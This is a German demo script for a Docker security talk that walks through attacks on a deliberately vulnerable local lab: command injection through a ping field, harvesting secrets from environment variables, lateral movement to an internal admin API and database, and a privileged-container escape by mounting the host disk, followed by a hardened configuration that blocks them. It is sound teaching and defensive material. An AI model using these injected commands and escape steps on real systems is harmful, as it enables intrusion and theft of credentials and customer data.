# Demo-Drehbuch: Docker Container Security

---

## Schritt 0 — Setup

### Container starten

```bash
cd docker-container-security
docker compose up -d --build
```

### Prüfen ob alles läuft

```bash
docker compose ps
```

Erwartete Ausgabe — alle drei Container müssen `running` zeigen:

```
NAME      STATUS
webapp    running
db        running
admin     running
```

### Browser-Tab öffnen

```
http://localhost:5001
```

### Terminal für die Demo bereithalten

---

## Angriff 1: Command Injection

**Was wird gezeigt:** Nutzereingabe wird ungefiltert als Shell-Befehl ausgeführt.

### 1.1 — Normaler Ping

Im Browser im Ping-Feld eingeben:

```
8.8.8.8
```

Erwartete Ausgabe:
```
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: ...
```

> *„Das ist ein normales Diagnose-Tool im Kundenportal — sieht harmlos aus."*

---

### 1.2 — Sind wir im Container?

> ⚠️ **Hinweis:** Der Befehl `cat /proc/1/cgroup` zeigt auf Systemen mit cgroup v2 nur `0::/` statt eines Docker-Pfads. Der folgende Befehl funktioniert zuverlässig auf allen Systemen.

Im Ping-Feld eingeben:

```
8.8.8.8; cat /.dockerenv && echo "Wir sind in einem Container"
```

Erwartete Ausgabe:
```
Wir sind in einem Container
```

> *„Moment — wir haben gerade einen zweiten Befehl nach dem Ping eingeschleust. Das Semikolon beendet den Ping und startet einen neuen Befehl. Die Datei /.dockerenv existiert nur innerhalb von Docker-Containern — wir befinden uns also in einem Container."*

---

### 1.3 — Wer bin ich?

Im Ping-Feld eingeben:

```
8.8.8.8; whoami
```

Erwartete Ausgabe (ganz unten im Ergebnis):
```
root
```

> *„Wir sind Root — also Administrator mit vollen Rechten. Die App übergibt die Eingabe ungefiltert an die Shell. Das ist Command Injection: wir können beliebige Befehle ausführen."*

---

### 1.4 — Quellcode der Anwendung lesen

Im Ping-Feld eingeben:

```
8.8.8.8; ls /app/
```

Erwartete Ausgabe: Dateien der Webanwendung (z.B. `app.py`, `templates/`, `requirements.txt`).

> *„Der Angreifer kann den kompletten Quellcode lesen. Dort finden sich oft hartcodierte Passwörter, API-Endpunkte und die Datenbankstruktur. Aber es gibt einen noch schnelleren Weg — die Umgebungsvariablen."*

---

## Angriff 2: Lateral Movement

**Was wird gezeigt:** Ein kompromittierter Container kann andere interne Dienste direkt ansprechen, weil keine Netzwerksegmentierung existiert.

### 2.1 — Umgebung erkunden: Was verrät der Container über sich?

> *„Ein Angreifer weiß zu diesem Zeitpunkt nicht, welche anderen Systeme es gibt. Sein erster Schritt ist immer: Umgebung erkunden. Umgebungsvariablen sind dabei eine Goldgrube — Entwickler hinterlegen dort oft Hostnamen, Passwörter und Verbindungsdaten."*

Im Ping-Feld eingeben:

```
; cat /proc/1/environ | tr '\0' '\n'
```

Erwartete Ausgabe enthält:
```
DB_HOST=db
DB_PASSWORD=root
SECRET_API_KEY=sk-prod-a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5
JWT_SECRET=my-super-secret-jwt-signing-key-2024
```

> *„Volltreffer. Wir sehen einen Datenbank-Host namens 'db' mit dem Passwort 'root' — und dazu noch API-Keys und ein JWT-Secret im Klartext. Der Angreifer weiß jetzt genau, wo er als nächstes hinmuss."*

---

### 2.2 — Netzwerk scannen: Wer ist noch da?

> *„Die Umgebungsvariablen haben uns die Datenbank verraten. Aber gibt es noch weitere Services? Docker nutzt einen internen DNS — wir können einfach typische Service-Namen ausprobieren."*

Im Ping-Feld eingeben:

```
; getent hosts db && getent hosts admin && getent hosts webapp
```

Erwartete Ausgabe (IP-Adressen der Container):
```
172.18.0.3    db
172.18.0.4    admin
172.18.0.2    webapp
```

> *„Drei Container im selben Netzwerk. Die Datenbank kennen wir schon aus den Env-Vars. Aber 'admin' ist interessant — ein interner Service, der von außen nicht erreichbar ist. Schauen wir mal, was der preisgibt."*

---

### 2.3 — Admin-Service angreifen

Im Ping-Feld eingeben:

```
; curl -s http://admin:8080/api/config
```

Erwartete Ausgabe:
```json
{
  "admin_users": [...],
  "internal_api_keys": {
    "aws_access_key": "AKIAIOSFODNN7EXAMPLE",
    "aws_secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "database_master_password": "SuperSecret123!"
  }
}
```

> *„Der Admin-Service ist nur im internen Netz — kein Browser weltweit kann ihn direkt aufrufen. Aber weil die Webapp im selben Netz hängt, können wir ihn über Docker-DNS ansprechen. Keine Authentifizierung, keine Zugriffskontrolle — alle API-Keys und AWS-Zugangsdaten liegen offen."*

---

### 2.4 — Datenbank abfragen

> *„Aus den Umgebungsvariablen kennen wir Host, User und Passwort. Jetzt greifen wir gezielt auf die Kundendaten zu."*

> **Hinweis:** Der Parameter `--ssl=0` wurde hinzugefügt, da MySQL sonst eine TLS-Fehlermeldung wirft.

Im Ping-Feld eingeben:

```
; mysql -h db -u root -proot --ssl=0 -e "SELECT * FROM kundenportal.kunden"
```

Erwartete Ausgabe:
```
id  vorname  nachname  email                        kreditkarte           kontostand
1   Anna     Müller    anna.mueller@example.com     4111-XXXX-XXXX-1234   15420.50
2   Thomas   Schmidt   thomas.schmidt@example.com   5500-XXXX-XXXX-5678   8930.00
...
```

> *„Das Datenbankpasswort stand in den Umgebungsvariablen im Klartext. Die Webapp hat direkten Netzwerkzugriff auf die DB. Kundendaten, Kreditkarteninformationen — alles in einer Anfrage."*

---

### 2.5 — Schadenspotenzial: Datenmanipulation

Im Ping-Feld eingeben:

```
; mysql -h db -u root -proot --ssl=0 -e "SELECT COUNT(*) AS anzahl_kunden FROM kundenportal.kunden"
```

Erwartete Ausgabe:
```
anzahl_kunden
5
```

> *„Wir haben nicht nur Lesezugriff. Mit einem UPDATE oder DELETE könnten wir Kontostände ändern, Daten manipulieren oder die gesamte Datenbank löschen. In der Praxis nutzen Angreifer das für Ransomware — Datenbank verschlüsseln, Lösegeld fordern."*

---

## Angriff 3: Container Escape

**Was wird gezeigt:** Ein Container mit `privileged: true` kann das Host-Dateisystem einhängen und hat damit vollen Zugriff auf den Host.

> **Hinweis für Docker Desktop (macOS/Windows):** Das Einhängen funktioniert, zeigt aber das Dateisystem der internen Linux-VM, nicht den Mac/Windows-Rechner. Das Prinzip ist identisch — kurz erklären, nicht als Fehler behandeln.

---

### 3.1 — Privilegierten Modus erkennen

> *„Wir haben jetzt Daten aus anderen Containern gestohlen. Aber können wir auch aus dem Container raus — auf das Host-System? Dafür prüfen wir, ob der Container besondere Rechte hat."*

> **Hinweis:** `fdisk` ist im Container nicht installiert. `lsblk` funktioniert zuverlässig.

Im Ping-Feld eingeben:

```
8.8.8.8; lsblk
```

Erwartete Ausgabe (Block-Devices des Hosts sind sichtbar):
```
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
vda    254:0    0 926.4G  0 disk
└─vda1 254:1    0 926.4G  0 part /etc/hosts
                                 /etc/hostname
                                 /etc/resolv.conf
```

> *„Ein normaler Container sieht keine Festplatten des Hosts. Weil dieser Container mit privileged: true läuft, sehen wir hier die echten Block-Devices des Hosts. 'vda1' ist die Hauptpartition — fast 1 Terabyte groß."*

---

### 3.2 — Host-Dateisystem einhängen

> *„Wir kennen jetzt den Device-Namen der Host-Festplatte: vda1. Im privilegierten Modus dürfen wir Dateisysteme mounten — etwas, das ein normaler Container niemals könnte. Wir hängen die Host-Partition in unseren Container ein und haben damit Zugriff auf alles, was auf dem Host liegt."*

Im Ping-Feld eingeben:

```
8.8.8.8; mkdir -p /mnt/host && mount /dev/vda1 /mnt/host && ls /mnt/host/
```

**Was passiert hier Schritt für Schritt:**

| Befehl | Was er tut |
|---|---|
| `mkdir -p /mnt/host` | Erstellt einen leeren Ordner als Einhängepunkt |
| `mount /dev/vda1 /mnt/host` | Hängt die Host-Festplatte in diesen Ordner ein |
| `ls /mnt/host/` | Zeigt den Inhalt — wir sehen jetzt die Host-Dateien |

**Warum dürfen wir das?** Normalerweise blockiert Docker den `mount`-Befehl — der Container hat die nötige Linux-Capability (`CAP_SYS_ADMIN`) nicht. Aber `privileged: true` in der Docker-Konfiguration schaltet **alle** Sicherheitsmechanismen ab: Der Container bekommt alle Capabilities, sieht alle Devices und darf Dateisysteme frei einhängen. Genau das ist der Fehler.

Erwartete Ausgabe:
```
cni  containerd  containerd-stargz-grpc  desktop-containerd  docker  dpkg  lost+found  machine-id  mutagen  nfs  swap  wasm
```

> *„Wir sehen jetzt die Host-Partition von innerhalb des Containers. Der Container ist ausgebrochen."*

---

### 3.3 — Host-Dateien lesen

> **Hinweis:** Unter Docker Desktop enthält die gemountete Partition die Docker-Datenpartition der VM, nicht ein vollständiges Linux-Root-Dateisystem. Auf einem echten Linux-Server wären hier `/etc/shadow` (Passwort-Hashes), SSH-Keys und alles andere sichtbar.

Im Ping-Feld eingeben:

```
8.8.8.8; cat /mnt/host/machine-id
```

Erwartete Ausgabe: Eine eindeutige Host-Kennung (z.B. `a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5`).

> *„Die Machine-ID identifiziert den Host eindeutig. Auf einem Produktivsystem könnten wir hier Passwort-Hashes, SSH-Keys und Konfigurationsdateien lesen."*

---

### 3.4 — Andere Container über den Host ausspionieren

Im Ping-Feld eingeben:

```
8.8.8.8; ls /mnt/host/docker/volumes
```

Erwartete Ausgabe (Volume-IDs und benannte Volumes):
```
1b2f530b0efe...
849d2387798a...
metadata.db
n8n-literaturereview_n8n_data
...
```

> *„Wir sehen jetzt nicht nur unsere eigenen Container, sondern die Volumes aller Docker-Projekte auf diesem Host — auch solche die gerade offline sind. Ein Angreifer könnte Daten aus völlig anderen Anwendungen lesen, die nichts mit unserem Kundenportal zu tun haben. Das zeigt: Ein Container Escape kompromittiert nicht nur eine Anwendung, sondern das gesamte System."*

---

---

## Härtung

**Was wird gezeigt:** Dieselben Angriffe schlagen in der gehärteten Version fehl.

### Im Terminal: Umschalten auf die gehärtete Version

```bash
docker compose down
docker compose -f docker-compose.hardened.yml up -d --build
```

---

### H.1 — Command Injection schlägt fehl

Im Ping-Feld eingeben:

```
8.8.8.8; whoami
```

Erwartete Ausgabe:
```
Ungültige Eingabe! Nur IP-Adressen und Hostnamen erlaubt.
```

> 💬 *„Input-Validierung mit Regex-Whitelist blockiert alles außer gültigen IPs und Hostnamen."*

---

### H.2 — Rechte im Container prüfen

Im Terminal:

```bash
docker compose -f docker-compose.hardened.yml exec webapp sh
```

Dann im Container:

```bash
whoami
```
```
appuser
```

```bash
fdisk -l
```
```
fdisk: cannot open /dev/sda: Permission denied
```

```bash
curl http://admin:8080
```
```
curl: (6) Could not resolve host: admin
```

Mit `exit` verlassen.

> 💬 *„Non-Root-User, keine Capabilities, keine Netzwerkverbindung zum Backend — selbst wenn ein Angreifer reinkäme, wäre der Schaden minimal."*

---

### Im Terminal aufräumen

```bash
docker compose -f docker-compose.hardened.yml down
```

---

## Troubleshooting

| Problem | Lösung |
|---|---|
| Browser zeigt nichts | `docker compose ps` prüfen — alle Container `running`? |
| MySQL antwortet nicht | Nochmal 30 Sek warten, dann `; mysql ...` erneut |
| MySQL TLS-Fehler | `--ssl=0` zum mysql-Befehl hinzufügen |
| `/proc/1/cgroup` zeigt nur `0::/` | cgroup v2 — stattdessen `cat /.dockerenv` verwenden |
| `fdisk -l` zeigt nichts | `fdisk` nicht installiert — `lsblk` verwenden |
| `/mnt/host/etc/shadow` nicht gefunden | Docker Desktop zeigt VM-Datenpartition — `cat /mnt/host/machine-id` und `ls /mnt/host/docker/volumes` verwenden |
| `/mnt/host` leer oder nicht vorhanden | Manuell mounten: `mkdir -p /mnt/host && mount /dev/vda1 /mnt/host` |
| Device-Name unbekannt | `; lsblk` ausführen und den richtigen Namen ablesen |
| Port 5001 nicht erreichbar | `docker compose ps` — läuft webapp? Sonst `docker compose logs webapp` |
| Gehärtete Version startet nicht | `docker compose down` sicherstellen, dann erneut `up` |
